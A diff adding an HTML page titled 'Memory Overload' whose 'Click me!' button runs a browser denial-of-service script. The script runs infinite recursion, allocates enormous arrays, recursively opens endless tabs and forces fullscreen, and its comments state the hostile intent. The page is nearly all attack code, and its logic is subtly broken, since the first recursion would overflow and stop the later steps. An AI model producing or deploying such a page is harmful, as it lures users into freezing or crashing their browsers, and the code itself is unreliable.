@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Memory Overload</title>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <button id="button">Click me!</button>
+  <script>
+    document.getElementById('button').addEventListener('click', function() {
+      // Create an infinite loop
+      function loop() {
+        loop();
+      }
+      loop();
+
+      // Consume a lot of memory
+      var arr = [];
+      for (var i = 0; i < 1000000; i++) {
+        arr.push(new Array(1000000).join('x'));
+      }
+
+      // Open multiple tabs
+      function openTab() {
+        window.open('about:blank', '_blank');
+        openTab();
+      }
+      openTab();
+
+      // Make the window full screen
+      document.documentElement.requestFullscreen();
+    });
+  </script>
+</body>
+</html>
